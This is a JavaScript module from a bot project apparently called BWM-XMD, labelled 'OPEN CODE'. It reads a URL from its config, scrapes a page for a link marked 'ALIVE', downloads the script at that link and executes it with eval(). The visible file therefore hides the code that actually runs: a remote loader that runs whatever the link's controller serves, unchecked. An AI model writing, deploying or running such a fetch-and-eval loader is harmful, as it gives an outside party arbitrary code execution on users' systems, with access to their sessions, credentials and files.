 // BWM-XMD 
 // QUANTUM VERSION 
// OPEN CODE 
 //Scripted by Sir Ibrahim Adams


const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchAliveUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const aliveUrlElement = $('a:contains("ALIVE")');
    const aliveUrl = aliveUrlElement.attr('href');

    if (!aliveUrl) {
      throw new Error('Alive not found 😭');
    }

    console.log('Alive loaded successfully ✅');

    const scriptResponse = await axios.get(aliveUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAliveUrl();
